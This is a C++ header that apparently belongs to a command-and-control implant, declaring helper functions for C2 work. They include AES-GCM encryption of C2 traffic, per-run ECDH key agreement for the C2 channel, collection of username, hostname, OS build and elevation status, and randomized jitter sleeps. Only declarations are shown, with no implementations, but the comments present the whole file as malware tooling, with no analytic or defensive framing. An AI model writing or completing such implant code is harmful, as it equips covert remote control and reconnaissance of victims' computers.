#pragma once
#include <windows.h>
#include <string>
#include <vector>

// ---------------------------------------------------------------------------
// String conversion
// ---------------------------------------------------------------------------
std::string  WStringToUTF8(const std::wstring& wstr);
std::wstring UTF8ToWString(const std::string& utf8);

// ---------------------------------------------------------------------------
// Encoding
// ---------------------------------------------------------------------------
std::string        Base64Encode(const BYTE* data, size_t len);
std::vector<BYTE>  Base64Decode(const std::string& b64);

// ---------------------------------------------------------------------------
// AES-256-GCM (BCrypt) — double-encrypts C2 traffic
//   Wire format: Base64( nonce[12] || tag[16] || ciphertext )
// ---------------------------------------------------------------------------
std::string AesGcmEncrypt(const std::vector<BYTE>& key32,
                          const std::string& plaintext);

std::string AesGcmDecrypt(const std::vector<BYTE>& key32,
                          const std::string& b64Wire);

// ---------------------------------------------------------------------------
// SHA-256 over raw bytes (CryptoAPI)
// ---------------------------------------------------------------------------
std::vector<BYTE> Sha256Bytes(const BYTE* data, size_t len);

// ---------------------------------------------------------------------------
// Ephemeral ECDH P-256 — C2 channel key agreement (BCrypt)
//   The implant generates a fresh keypair per run. Public points travel as
//   Base64( X[32] || Y[32] ) in standard big-endian point encoding; BCrypt
//   blobs are little-endian, converted internally. Channel key:
//     SHA-256( ECDH shared secret )
// ---------------------------------------------------------------------------
BOOL          EcdhInit();        // generate implant keypair + cache public point
std::string   EcdhPublicKeyB64();// Base64( X||Y ), big-endian
BOOL          EcdhDeriveSessionKey(const std::string& serverPubB64,
                                   std::vector<BYTE>& key32);

// ---------------------------------------------------------------------------
// System info
// ---------------------------------------------------------------------------
std::wstring GetHostnameHash();   // FNV-1a 32-bit → 8-char hex wstring
std::wstring GetUsername();
std::wstring GetHostname();
DWORD        GetOSBuild();        // via RtlGetVersion (shim-immune)
BOOL         IsElevated();        // TokenElevation query

// ---------------------------------------------------------------------------
// Timing
// ---------------------------------------------------------------------------
VOID JitterSleep(DWORD minSec, DWORD maxSec);  // uniform distribution